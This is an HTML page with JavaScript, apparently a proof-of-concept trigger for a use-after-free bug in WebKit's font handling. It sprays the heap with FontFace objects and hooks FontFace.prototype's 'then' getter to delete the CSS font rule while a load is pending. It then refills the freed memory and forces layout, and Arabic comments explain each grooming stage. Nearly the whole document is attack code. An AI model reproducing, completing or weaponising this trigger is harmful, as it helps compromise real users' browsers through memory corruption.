<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: targetFont; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
    <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
        [INFO] WebKit UAF - Heap Grooming Environment...
    </div>

<script>
function updateStatus(message) {
    const panel = document.getElementById('status_panel');
    if (panel) panel.innerHTML += "<br>[*] " + message;
}

// مصفوفة عالمية للاحتفاظ بالكائنات في الذاكرة ومنع نظام الـ Garbage Collection من حذفها تلقائياً
let memoryGroomer = [];

window.onload = () => {
    updateStatus("Preparing stable memory structures...");

    // 1. مرحلة ما قبل التحرير (Pre-allocation): ملء مساحات الذاكرة القريبة لجعل الـ Heap مستقراً
    for (let i = 0; i < 100; i++) {
        memoryGroomer.push(new FontFace('shapingFont' + i, 'local(Arial)', { unicodeRange: 'U+0041' }));
    }

    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let fired = false;

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                updateStatus("Hook triggered. Performing precise memory re-allocation...");

                // 2. مرحلة الحذف والتحرير
                document.getElementById('s').sheet.deleteRule(0);

                // 3. مرحلة ملء الفراغ الفوري (Grooming): محاولة جعل مخصص الذاكرة يضع كائنات جديدة في نفس المساحة المحررة
                // هذا يمنع الكرش الفوري الناجم عن محاولة قراءة مساحة فارغة تماماً
                for (let j = 0; j < 50; j++) {
                    memoryGroomer.push(new FontFace('fillerFont' + j, 'local(Courier)', { unicodeRange: 'U+0041' }));
                }

                updateStatus("Forcing layout calculation on groomed heap...");
                document.body.offsetTop; 
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');

    setTimeout(() => {
        updateStatus("Sequence complete. Observation phase active.");
    }, 500);
};
</script>
</body>
</html>
